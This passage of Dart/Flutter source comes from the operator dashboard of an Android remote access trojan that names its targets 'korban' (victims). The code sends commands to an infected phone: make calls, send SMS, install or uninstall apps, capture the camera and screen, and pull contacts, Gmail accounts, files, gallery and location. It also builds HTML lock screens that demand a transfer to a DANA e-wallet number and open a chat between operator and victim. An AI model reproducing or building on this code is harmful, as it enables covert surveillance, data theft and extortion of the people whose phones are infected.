                        fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.textMuted, letterSpacing: 1)),
                const SizedBox(height: 6),
                Wrap(
                  spacing: 8,
                  runSpacing: 8,
                  children: [1000, 2000, 3000, 5000].map((v) {
                    final sel = dur == v;
                    return GestureDetector(
                      onTap: () => setState(() => dur = v),
                      child: Container(
                        padding:
                            const EdgeInsets.symmetric(horizontal: 14, vertical: 6),
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(8),
                          color: sel ? Neo.coral : Neo.cream,
                          border: Border.all(color: Neo.textDark, width: 2.5),
                          boxShadow: sel ? Neo.shadow(offset: 2) : [],
                        ),
                        child: Text(
                          '${v}ms',
                          style: TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 9,
                              color: sel ? Neo.white : Neo.textDark),
                        ),
                      ),
                    );
                  }).toList(),
                ),
                const SizedBox(height: 16),
                Row(
                  children: [
                    Expanded(
                      child: NeoButton(
                        label: 'BATAL',
                        color: Neo.cream,
                        textColor: Neo.textMuted,
                        onPressed: () => Navigator.pop(ctx),
                      ),
                    ),
                    const SizedBox(width: 10),
                    Expanded(
                      flex: 2,
                      child: NeoButton(
                        label: 'AKTIFKAN',
                        color: Neo.coral,
                        onPressed: () {
                          final url = urlCtrl.text.trim();
                          if (url.isEmpty) {
                            _toast('URL tidak boleh kosong!', error: true);
                            return;
                          }
                          _cmd('jumpscare2Start',
                              jsonEncode({'url': url, 'duration': dur}));
                          _patch('jumpscare2Active', true);
                          _patch('jumpscare2Url', url);
                          _patch('jumpscare2Duration', dur);
                          Navigator.pop(ctx);
                          _toast('Jumpscare V2 Aktif!', error: true);
                        },
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Future<void> _showCallPhone() async {
    final numCtrl = TextEditingController();
    await _showPrompt(
      title: 'CALL PHONE',
      sub: 'Buat device menelepon nomor',
      color: Neo.mint,
      icon: Icons.phone_in_talk_outlined,
      fields: [('Nomor Telepon', numCtrl, '08XXXXXXXXXX')],
      okLabel: 'CALL',
      onOkCheck: () => numCtrl.text.trim().isNotEmpty,
      onOk: () {
        final num = numCtrl.text.trim();
        _cmd('callPhone', num);
        _toast('Memanggil $num');
        return true;
      },
    );
  }

  Future<void> _showSendSms() async {
    final numCtrl = TextEditingController();
    final msgCtrl = TextEditingController();
    await _showPrompt(
      title: 'KIRIM SMS',
      sub: 'Kirim SMS dari device target',
      color: _amber,
      icon: Icons.sms_outlined,
      fields: [
        ('Nomor Tujuan', numCtrl, '08XXXXXXXXXX'),
        ('Isi Pesan', msgCtrl, 'Pesan...'),
      ],
      okLabel: 'KIRIM',
      onOkCheck: () =>
          numCtrl.text.trim().isNotEmpty && msgCtrl.text.trim().isNotEmpty,
      onOk: () {
        final num = numCtrl.text.trim();
        _cmd('sendSms', jsonEncode({'number': num, 'message': msgCtrl.text.trim()}));
        _toast('SMS terkirim ke $num');
        return true;
      },
    );
  }

  Future<void> _showWifiConnect([String? ssid]) async {
    final ssidCtrl = TextEditingController(text: ssid ?? '');
    final passCtrl = TextEditingController();
    await _showPrompt(
      title: 'WIFI CONNECT',
      sub: 'Hubungkan device ke WiFi',
      color: Neo.sky,
      icon: Icons.wifi,
      fields: [
        ('SSID', ssidCtrl, 'Nama WiFi'),
        ('Password', passCtrl, 'Password WiFi'),
      ],
      okLabel: 'CONNECT',
      onOkCheck: () => ssidCtrl.text.trim().isNotEmpty,
      onOk: () {
        final s = ssidCtrl.text.trim();
        _cmd('wifi:connect',
            jsonEncode({'ssid': s, 'password': passCtrl.text.trim()}));
        _toast('Menghubungkan ke $s');
        return true;
      },
    );
  }

  Future<void> _showInstallApk() async {
    final urlCtrl = TextEditingController();
    await _showPrompt(
      title: 'INSTALL APK',
      sub: 'Install aplikasi dari URL ke device',
      color: Neo.mint,
      icon: Icons.download_for_offline_outlined,
      fields: [('URL APK', urlCtrl, 'https://example.com/app.apk')],
      okLabel: 'INSTALL',
      onOkCheck: () => urlCtrl.text.trim().isNotEmpty,
      onOk: () {
        _cmd('app:install', jsonEncode({'url': urlCtrl.text.trim()}));
        _toast('Installing APK...');
        return true;
      },
    );
  }

  Future<void> _showUninstall() async {
    final pkgCtrl = TextEditingController();
    await _showPrompt(
      title: 'UNINSTALL APP',
      sub: 'Masukkan package name aplikasi',
      color: Neo.coral,
      icon: Icons.delete_outline,
      fields: [('Package Name', pkgCtrl, 'com.example.app')],
      okLabel: 'UNINSTALL',
      danger: true,
      onOkCheck: () => pkgCtrl.text.trim().isNotEmpty,
      onOk: () {
        final pkg = pkgCtrl.text.trim();
        _cmd('app:uninstall', jsonEncode({'package': pkg}));
        _toast('Uninstalling $pkg');
        return true;
      },
    );
  }

  Future<void> _takeShot(String facing) async {
    final id = _deviceId!;
    _toast('Membuka kamera ${facing == 'front' ? 'depan' : 'belakang'}...', info: true);
    final result = await client.takeScreenshot(id, facing);
    if (!mounted) return;
    if (result == null) {
      _toast('Gagal ambil foto', error: true);
      return;
    }
    _showImageResult(result['frame'] as String, facing);
  }

  void _showImageResult(String frame, String facing) {
    Uint8List? bytes;
    try {
      bytes = base64Decode(frame);
    } catch (_) {}
    showDialog(
      context: context,
      barrierColor: Colors.black54,
      builder: (ctx) => Dialog(
        backgroundColor: Neo.white,
        shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(12),
            side: const BorderSide(color: Neo.textDark, width: 3)),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Padding(
              padding: const EdgeInsets.all(12),
              child: Row(
                children: [
                  Text(
                    'FOTO ${facing.toUpperCase()}',
                    style: const TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 11,
                        letterSpacing: 2,
                        color: Neo.mint),
                  ),
                  const Spacer(),
                  GestureDetector(
                    onTap: () => Navigator.pop(ctx),
                    child: const Icon(Icons.close, color: Neo.textMuted, size: 18),
                  ),
                ],
              ),
            ),
            if (bytes != null)
              ConstrainedBox(
                constraints: BoxConstraints(
                    maxHeight: MediaQuery.of(context).size.height * 0.6),
                child: InteractiveViewer(
                  child: Image.memory(bytes, fit: BoxFit.contain),
                ),
              )
            else
              const Padding(
                padding: EdgeInsets.all(32),
                child: Text('FRAME TIDAK VALID',
                    style: TextStyle(fontFamily: 'ShareTechMono', color: Neo.coral, fontSize: 10)),
              ),
          ],
        ),
      ),
    );
  }

  // Ã¢â€â‚¬Ã¢â€â‚¬ Live overlays Ã¢â€â‚¬Ã¢â€â‚¬
  void _openCameraLive(String facing) {
    _cmd('camera', facing);
    _patch('cameraActive', true);
    Navigator.of(context).push(MaterialPageRoute(
      builder: (_) => _LiveStreamView(
        client: client,
        deviceId: _deviceId!,
        kind: 'camera',
        initialFacing: facing,
      ),
    ));
  }

  void _openScreenLive() {
    Navigator.of(context).push(MaterialPageRoute(
      builder: (_) => _LiveStreamView(
        client: client,
        deviceId: _deviceId!,
        kind: 'screen',
      ),
    ));
  }

  // Ã¢â€â‚¬Ã¢â€â‚¬ Data overlays Ã¢â€â‚¬Ã¢â€â‚¬
  void _openGallery() {
    client.clearData(_deviceId!, 'gallery');
    _cmd('getGallery', '');
    _toast('Meminta galeri...', info: true);
    Navigator.of(context).push(MaterialPageRoute(
        builder: (_) => _GalleryView(client: client, deviceId: _deviceId!)));
  }

  void _openFiles() {
    client.clearData(_deviceId!, 'files');
    _cmd('getFiles', '/');
    _toast('Membuka file manager...', info: true);
    Navigator.of(context).push(MaterialPageRoute(
        builder: (_) => _FileView(client: client, deviceId: _deviceId!)));
  }

  void _openContacts() {
    client.clearData(_deviceId!, 'contacts');
    _cmd('getContacts', '');
    _toast('Meminta kontak...', info: true);
    Navigator.of(context).push(MaterialPageRoute(
        builder: (_) => _ListViewer(
          client: client,
          deviceId: _deviceId!,
          keyName: 'contacts',
          title: 'KONTAK',
          subtitle: 'DAFTAR KONTAK DEVICE',
        )));
  }

  void _openGmail() {
    client.clearData(_deviceId!, 'gmail');
    _cmd('getGmail', '');
    _toast('Meminta akun gmail...', info: true);
    Navigator.of(context).push(MaterialPageRoute(
        builder: (_) => _ListViewer(
          client: client,
          deviceId: _deviceId!,
          keyName: 'gmail',
          title: 'GMAIL',
          subtitle: 'AKUN GOOGLE & LAINNYA',
        )));
  }

  void _openPhone() {
    client.clearData(_deviceId!, 'phone');
    _cmd('getPhone', '');
    _toast('Meminta nomor...', info: true);
    Navigator.of(context).push(MaterialPageRoute(
        builder: (_) => _ListViewer(
          client: client,
          deviceId: _deviceId!,
          keyName: 'phone',
          title: 'PHONE',
          subtitle: 'NOMOR TELEPON SIM',
        )));
  }

  void _openLocation() {
    client.clearData(_deviceId!, 'location');
    client.clearData(_deviceId!, 'locationBundle');
    _cmd('getLocation', '');
    client.fetchLocationData(_deviceId!);
    _toast('Mengambil lokasi & history...', info: true);
    Navigator.of(context).push(MaterialPageRoute(
        builder: (_) => _LocationView(client: client, deviceId: _deviceId!)));
  }

  void _openBlockApp() {
    client.clearData(_deviceId!, 'apps');
    _cmd('getInstalledApps', '');
    _toast('Meminta daftar aplikasi...', info: true);
    Navigator.of(context).push(MaterialPageRoute(
        builder: (_) => _BlockAppView(client: client, deviceId: _deviceId!)));
  }

  // Ã¢â€â‚¬Ã¢â€â‚¬ Device picker Ã¢â€â‚¬Ã¢â€â‚¬
  Future<void> _openPicker({bool initial = false}) async {
    final id = await showModalBottomSheet<String>(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (_) => _DeviceSheet(client: client),
    );
    if (id != null && mounted) {
      setState(() {
        _deviceId = id;
        _devinfoOpen = false;
      });
      _toast('Device dipilih');
    }
  }

  // Ã¢â€â‚¬Ã¢â€â‚¬ Lock Chat panel Ã¢â€â‚¬Ã¢â€â‚¬
  Widget _buildLockChatPanel(RatDevice d) {
    final msgs = client.chatMessages(d.id);
    return NeoCard(
      color: Neo.white,
      borderColor: Neo.coral,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Padding(
            padding: const EdgeInsets.all(12),
            child: Row(
              children: [
                Container(
                  width: 8,
                  height: 8,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Neo.coral,
                    boxShadow: [BoxShadow(color: Neo.coral, blurRadius: 0)],
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(d.statusStr('lockChatTitle', 'PERANGKAT TERKUNCI'),
                          style: const TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 12,
                              fontWeight: FontWeight.w700,
                              color: Neo.textDark)),
                      const Text('LOCK CHAT ACTIVE',
                          style: TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 8,
                              letterSpacing: 1.5,
                              color: Neo.textMuted)),
                    ],
                  ),
                ),
                Container(
                  width: 8,
                  height: 8,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Neo.coral,
                    boxShadow: [BoxShadow(color: Neo.coral, blurRadius: 0)],
                  ),
                ),
                const SizedBox(width: 6),
                const Text('LIVE',
                    style: TextStyle(
                        fontFamily: 'ShareTechMono', fontSize: 8, color: Neo.coral, letterSpacing: 1.5)),
              ],
            ),
          ),
          if (d.statusStr('lockChatDana', '').isNotEmpty)
            Container(
              margin: const EdgeInsets.symmetric(horizontal: 12),
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(12),
                color: Neo.cream,
                border: Border.all(color: Neo.sky, width: 2.5),
              ),
              child: Row(
                children: [
                  const Icon(Icons.credit_card, color: Neo.sky, size: 18),
                  const SizedBox(width: 10),
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text('TRANSFER KE DANA',
                          style: TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 8,
                              letterSpacing: 1.5,
                              color: Neo.textMuted)),
                      Text(d.statusStr('lockChatDana', ''),
                          style: const TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 14,
                              fontWeight: FontWeight.w700,
                              color: Neo.sky)),
                    ],
                  ),
                ],
              ),
            ),
          Container(
            height: 200,
            margin: const EdgeInsets.all(12),
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: Neo.cream,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: Neo.cream),
            ),
            child: msgs.isEmpty
                ? const Center(
                    child: Text('Menunggu pesan dari korban...',
                        style: TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 9,
                            color: Neo.textMuted)),
                  )
                : ListView.builder(
                    itemCount: msgs.length,
                    itemBuilder: (_, i) {
                      final m = msgs[i];
                      final isOp = m.from == 'operator';
                      return Align(
                        alignment: isOp ? Alignment.centerRight : Alignment.centerLeft,
                        child: Container(
                          margin: const EdgeInsets.symmetric(vertical: 3),
                          padding: const EdgeInsets.all(9),
                          constraints: const BoxConstraints(maxWidth: 280),
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(12),
                            color: isOp ? Neo.coral : Neo.mint,
                            border: Border.all(color: Neo.textDark, width: 2),
                          ),
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Text(isOp ? 'OPERATOR' : 'KORBAN',
                                  style: TextStyle(
                                      fontFamily: 'ShareTechMono',
                                      fontSize: 7,
                                      letterSpacing: 1,
                                      color: isOp ? _red : _green)),
                              const SizedBox(height: 3),
                              Text(m.text,
                                  style: const TextStyle(
                                      fontFamily: 'ShareTechMono',
                                      fontSize: 10,
                                      color: Neo.textDark)),
                            ],
                          ),
                        ),
                      );
                    },
                  ),
          ),
          Padding(
            padding: const EdgeInsets.fromLTRB(12, 0, 12, 12),
            child: Row(
              children: [
                Expanded(
                  child: TextField(
                    controller: _chatInput,
                    style: const TextStyle(
                        fontFamily: 'ShareTechMono', fontSize: 11, color: Neo.textDark),
                    decoration: InputDecoration(
                      hintText: 'Ketik balasan...',
                      hintStyle: const TextStyle(
                          fontFamily: 'ShareTechMono', fontSize: 10, color: Neo.textMuted),
                      filled: true,
                      fillColor: Neo.cream,
                      enabledBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(10),
                        borderSide: const BorderSide(color: Neo.textDark, width: 2.5),
                      ),
                      focusedBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(10),
                        borderSide: const BorderSide(color: Neo.coral, width: 3),
                      ),
                      contentPadding: const EdgeInsets.symmetric(
                          horizontal: 14, vertical: 12),
                    ),
                    onSubmitted: (_) => _sendChatReply(),
                  ),
                ),
                const SizedBox(width: 8),
                GestureDetector(
                  onTap: _sendChatReply,
                  child: Container(
                    width: 40,
                    height: 44,
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(10),
                      color: Neo.mint,
                      border: Border.all(color: Neo.textDark, width: 2.5),
                      boxShadow: Neo.shadow(offset: 2),
                    ),
                    child: const Icon(Icons.send, size: 16, color: Neo.textDark),
                  ),
                ),
              ],
            ),
          ),
          Padding(
            padding: const EdgeInsets.fromLTRB(12, 0, 12, 12),
            child: NeoButton(
              label: 'UNLOCK DEVICE',
              icon: Icons.lock_open,
              color: Neo.coral,
              onPressed: () {
                _cmd('lockChat', jsonEncode({'action': 'stop'}));
                _cmd('unlockDevice', '');
                _patch('lockChatActive', false);
                _patch('lockCustomActive', false);
                _patch('deviceLocked', false);
                _toast('Device unlocked & Lock Chat dimatikan');
              },
            ),
          ),
        ],
      ),
    );
  }

  void _sendChatReply() {
    final text = _chatInput.text.trim();
    if (text.isEmpty) return;
    client.sendChatReply(_deviceId!, text);
    _chatInput.clear();
  }

  // Ã¢â€â‚¬Ã¢â€â‚¬ Lock HTML builders Ã¢â€â‚¬Ã¢â€â‚¬
  String _defaultLockHtml() {
    return '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#060A14;min-height:100dvh;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',sans-serif;overflow:hidden}
  .bg{position:fixed;inset:0;background:radial-gradient(ellipse 70% 45% at 12% -8%,rgba(99,102,241,.20) 0%,transparent 60%),radial-gradient(ellipse 55% 40% at 96% 105%,rgba(139,92,246,.16) 0%,transparent 60%),#060A14}
  .wrap{position:relative;z-index:10;text-align:center;padding:40px 32px;width:100%;max-width:340px}
  .lock{width:76px;height:76px;margin:0 auto 20px;border-radius:24px;background:linear-gradient(160deg,rgba(129,140,248,.16),rgba(139,92,246,.06));border:1px solid rgba(129,140,248,.35);display:flex;align-items:center;justify-content:center;box-shadow:0 18px 50px rgba(99,102,241,.22)}
  .lock svg{width:32px;height:32px;color:#A5B4FC;fill:none;stroke:currentColor;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
  h1{color:#EEF2FF;font-size:20px;font-weight:700;letter-spacing:.3px;margin-bottom:6px}
  .sub{color:#94A3B8;font-size:12px;margin-bottom:22px}
  .pin{display:flex;gap:10px;justify-content:center}
  .dots{display:flex;gap:8px;justify-content:center;margin-bottom:18px}
  .dot{width:12px;height:12px;border-radius:50%;border:1.5px solid rgba(129,140,248,.4);transition:all .15s}
  .dot.fill{background:linear-gradient(135deg,#6366F1,#8B5CF6);border-color:transparent;box-shadow:0 0 12px rgba(129,140,248,.7)}
  .keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;max-width:286px;margin:0 auto}
  .key{height:58px;border-radius:16px;border:1px solid rgba(255,255,255,.07);background:linear-gradient(160deg,rgba(255,255,255,.05),rgba(255,255,255,.015));color:#EEF2FF;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:22px;font-weight:600;-webkit-tap-highlight-color:transparent;user-select:none;transition:transform .1s,background .1s}
  .key:active{transform:scale(.93);background:rgba(129,140,248,.16)}
  .key.fn{color:#94A3B8}
  .key.ok{background:linear-gradient(135deg,#6366F1,#8B5CF6);color:#fff}
  .key.ok:active{background:linear-gradient(135deg,#8B5CF6,#6366F1)}
  .err{color:#FB7185;font-size:11px;margin-top:12px;min-height:16px}
  .brand{position:fixed;bottom:38px;left:0;right:0;text-align:center;font-size:10px;letter-spacing:6px;font-weight:700;background:linear-gradient(90deg,#818cf8,#a78bfa,#67e8f9);-webkit-background-clip:text;background-clip:text;color:transparent}
  .credit{position:fixed;bottom:16px;left:0;right:0;text-align:center;font-size:9px;letter-spacing:3px;color:rgba(148,163,184,.5)}
</style>
</head>
<body>
<div class="bg"></div>
<div class="wrap">
  <div class="lock"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="3"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><circle cx="12" cy="16.5" r="1.3" fill="currentColor" stroke="none"/></svg></div>
  <h1>PERANGKAT TERKUNCI</h1>
  <div class="sub">Masukkan PIN untuk membuka perangkat</div>
  <div class="dots" id="dots">
    <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
  </div>
  <div class="keypad" id="keypad">
    <div class="key" data-n="1">1</div><div class="key" data-n="2">2</div><div class="key" data-n="3">3</div>
    <div class="key" data-n="4">4</div><div class="key" data-n="5">5</div><div class="key" data-n="6">6</div>
    <div class="key" data-n="7">7</div><div class="key" data-n="8">8</div><div class="key" data-n="9">9</div>
    <div class="key fn" data-del="1">âŒ«</div><div class="key" data-n="0">0</div><div class="key ok" data-go="1">âœ“</div>
  </div>
  <div class="err" id="e"></div>
</div>
<div class="brand">X E T E R N A L Z</div>
<div class="credit">KIZZ DAN DENIS</div>
<script>
var PIN='';
var MAXPIN=6;
var keypad=document.getElementById('keypad');
keypad.addEventListener('touchend',function(e){e.preventDefault();tap(e.target)},false);
keypad.addEventListener('click',function(e){if(e.sourceCapabilities&&e.sourceCapabilities.firesTouchEvents)return;tap(e.target)});
function tap(el){
  while(el&&!el.dataset.n&&!el.dataset.del&&!el.dataset.go)el=el.parentElement;
  if(!el)return;
  if(el.dataset.del){PIN=PIN.slice(0,-1)}
  else if(el.dataset.go){if(PIN)tryU()}
  else{if(PIN.length>=MAXPIN)return;PIN+=el.dataset.n}
  render();
}
function render(){
  var dots=document.querySelectorAll('.dot');
  for(var i=0;i<dots.length;i++){dots[i].className='dot'+(i<PIN.length?' fill':'')}
  var e=document.getElementById('e');e.textContent='';
}
function tryU(){
  var e=document.getElementById('e');
  if(window.Android){Android.unlockDevice();return}
  window.location='secure://unlock';
}
</script>
</body>
</html>''';
  }
  String _lockChatHtml(String title, String dana, String pin) {
    final danaBox = dana.isEmpty
        ? ''
        : '''<div class="lc-dana"><div class="lc-dana-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg></div><div><div class="lc-dana-label">TRANSFER KE DANA</div><div class="lc-dana-number">$dana</div></div></div>''';
    return '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#060A14;min-height:100dvh;display:flex;flex-direction:column;font-family:'Segoe UI',sans-serif;overflow:hidden}
  .lc-bg{position:fixed;inset:0;background:radial-gradient(ellipse 70% 45% at 12% -8%,rgba(99,102,241,.18) 0%,transparent 60%),radial-gradient(ellipse 55% 40% at 96% 105%,rgba(139,92,246,.14) 0%,transparent 60%),#060A14}
  .lc-top{position:relative;z-index:10;display:flex;flex-direction:column;align-items:center;padding:26px 24px 12px;gap:10px;flex-shrink:0}
  .lc-badge{display:flex;align-items:center;gap:6px;background:rgba(129,140,248,.1);border:1px solid rgba(129,140,248,.3);border-radius:20px;padding:4px 12px}
  .lc-badge-dot{width:6px;height:6px;border-radius:50%;background:#A78BFA;box-shadow:0 0 8px #A78BFA;animation:blink 1s infinite}
  @keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}
  .lc-badge-text{font-size:9px;letter-spacing:3px;color:#A5B4FC;font-weight:700;text-transform:uppercase}
  .lc-lock-icon{width:56px;height:56px;border-radius:18px;background:linear-gradient(160deg,rgba(129,140,248,.16),rgba(139,92,246,.06));border:1px solid rgba(129,140,248,.35);display:flex;align-items:center;justify-content:center;box-shadow:0 12px 36px rgba(99,102,241,.22)}
  .lc-lock-icon svg{width:24px;height:24px;color:#A5B4FC}
  .lc-title{font-size:18px;font-weight:700;color:#EEF2FF;text-align:center;letter-spacing:.2px}
  .lc-subtitle{font-size:10px;letter-spacing:2px;color:#94A3B8;text-transform:uppercase}
  .lc-dana{position:relative;z-index:10;display:flex;align-items:center;gap:12px;background:rgba(99,102,241,.1);border:1px solid rgba(99,102,241,.3);border-radius:14px;padding:12px 16px;margin:0 24px;flex-shrink:0}
  .lc-dana-icon{width:40px;height:40px;border-radius:10px;background:rgba(99,102,241,.14);border:1px solid rgba(99,102,241,.25);display:flex;align-items:center;justify-content:center;flex-shrink:0;color:#A5B4FC}
  .lc-dana-label{font-size:9px;letter-spacing:2px;color:#94A3B8;text-transform:uppercase;margin-bottom:2px}
  .lc-dana-number{font-size:18px;font-weight:700;color:#C7D2FE;letter-spacing:1px}
  .lc-pin-dots{display:flex;gap:6px;margin-bottom:14px;padding:0 24px;justify-content:center;flex-shrink:0}
  .lc-pin-dot{width:11px;height:11px;border-radius:50%;border:1.5px solid rgba(129,140,248,.4);transition:all .15s}
  .lc-pin-dot.fill{background:linear-gradient(135deg,#6366F1,#8B5CF6);border-color:transparent;box-shadow:0 0 10px rgba(129,140,248,.7)}
  .lc-keypad{position:relative;z-index:10;display:grid;grid-template-columns:repeat(3,1fr);gap:8px;max-width:286px;margin:0 auto;flex-shrink:0}
  .lc-key{height:52px;border-radius:14px;border:1px solid rgba(255,255,255,.07);background:linear-gradient(160deg,rgba(255,255,255,.05),rgba(255,255,255,.015));color:#EEF2FF;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:20px;font-weight:600;-webkit-tap-highlight-color:transparent;user-select:none;transition:transform .1s,background .1s}
  .lc-key:active{transform:scale(.93);background:rgba(129,140,248,.16)}
  .lc-key.fn{color:#94A3B8}
  .lc-key.ok{background:linear-gradient(135deg,#6366F1,#8B5CF6);color:#fff}
  .lc-key.ok:active{background:linear-gradient(135deg,#8B5CF6,#6366F1)}
  .lc-error{font-size:11px;color:#FB7185;text-align:center;min-height:16px;margin:4px 0 0;flex-shrink:0}
  .lc-chat-wrap{position:relative;z-index:10;flex:1;display:flex;flex-direction:column;margin:12px 16px 0;min-height:0;overflow:hidden}
  .lc-chat-header{display:flex;align-items:center;gap:8px;padding:8px 12px;border-radius:10px 10px 0 0;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-bottom:none;flex-shrink:0}
  .lc-chat-dot{width:6px;height:6px;border-radius:50%;background:#A78BFA;box-shadow:0 0 6px #A78BFA;animation:blink 1.5s infinite}
  .lc-chat-label{font-size:9px;letter-spacing:2px;color:#94A3B8;text-transform:uppercase}
  .lc-chat-msgs{flex:1;overflow-y:auto;padding:10px 12px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.06);border-top:none;display:flex;flex-direction:column;gap:8px;min-height:80px}
  .lc-msg{max-width:85%;padding:8px 12px;border-radius:12px;font-size:12px;line-height:1.5;color:#E2E8F0;animation:fadeInUp .3s ease}
  @keyframes fadeInUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
  .lc-msg.operator{background:rgba(139,92,246,.12);border:1px solid rgba(139,92,246,.2);align-self:flex-end;border-bottom-right-radius:4px}
  .lc-msg.victim{background:rgba(34,211,238,.07);border:1px solid rgba(34,211,238,.15);align-self:flex-start;border-bottom-left-radius:4px}
  .lc-msg-time{font-size:8px;color:#526075;margin-top:4px;text-align:right}
  .lc-msg-empty{text-align:center;font-size:10px;color:#526075;padding:20px;letter-spacing:1px}
  .lc-chat-input-wrap{display:flex;gap:6px;padding:8px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-top:none;border-radius:0 0 10px 10px;flex-shrink:0}
  .lc-chat-input{flex:1;height:40px;border-radius:10px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);color:#EEF2FF;font-size:12px;padding:0 12px;outline:none}
  .lc-chat-input::placeholder{color:#526075}
  .lc-chat-send{width:40px;height:40px;border-radius:10px;border:none;background:linear-gradient(135deg,#6366F1,#8B5CF6);color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 6px 18px rgba(99,102,241,.3)}
  .lc-chat-send svg{width:16px;height:16px}
  .lc-actions{display:flex;gap:6px;padding:6px 8px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-top:none;flex-shrink:0}
  .lc-act-btn{flex:1;height:34px;border-radius:10px;border:1px solid rgba(139,92,246,.25);background:rgba(139,92,246,.08);color:#C4B5FD;font-size:9px;letter-spacing:1.5px;text-transform:uppercase;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;font-family:'Segoe UI',sans-serif}
  .lc-act-btn:active{background:rgba(139,92,246,.22)}
  .lc-act-btn svg{width:13px;height:13px}
  .lc-brand{position:fixed;bottom:34px;left:0;right:0;text-align:center;font-size:10px;letter-spacing:6px;font-weight:700;background:linear-gradient(90deg,#818cf8,#a78bfa,#67e8f9);-webkit-background-clip:text;background-clip:text;color:transparent;z-index:20}
  .lc-credit{position:fixed;bottom:14px;left:0;right:0;text-align:center;font-size:9px;letter-spacing:3px;color:rgba(148,163,184,.45);z-index:20}
</style>
</head>
<body>
<div class="lc-bg"></div>
<div class="lc-top">
  <div class="lc-badge"><div class="lc-badge-dot"></div><span class="lc-badge-text">PERANGKAT TERKUNCI</span></div>
  <div class="lc-lock-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="3"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><circle cx="12" cy="16.5" r="1.3" fill="currentColor" stroke="none"/></svg></div>
  <div class="lc-title">$title</div>
  <div class="lc-subtitle">Masukkan PIN untuk membuka</div>
</div>
$danaBox
<div class="lc-pin-dots" id="lc-pin-dots"></div>
<div class="lc-keypad" id="lc-keypad">
  <div class="lc-key" data-n="1">1</div><div class="lc-key" data-n="2">2</div><div class="lc-key" data-n="3">3</div>
  <div class="lc-key" data-n="4">4</div><div class="lc-key" data-n="5">5</div><div class="lc-key" data-n="6">6</div>
  <div class="lc-key" data-n="7">7</div><div class="lc-key" data-n="8">8</div><div class="lc-key" data-n="9">9</div>
  <div class="lc-key fn" data-del="1">âŒ«</div><div class="lc-key" data-n="0">0</div><div class="lc-key ok" data-go="1">âœ“</div>
</div>
<div class="lc-error" id="lc-error"></div>
<div class="lc-chat-wrap">
  <div class="lc-chat-header"><div class="lc-chat-dot"></div><span class="lc-chat-label">Chat dengan Admin</span></div>
  <div class="lc-actions">
    <button class="lc-act-btn" onclick="actScreenshot()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>JEPRET</button>
    <button class="lc-act-btn" onclick="actMic()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="2" width="6" height="12" rx="3"/><path d="M5 10a7 7 0 0 0 14 0M12 17v4"/></svg>REKAM</button>
  </div>
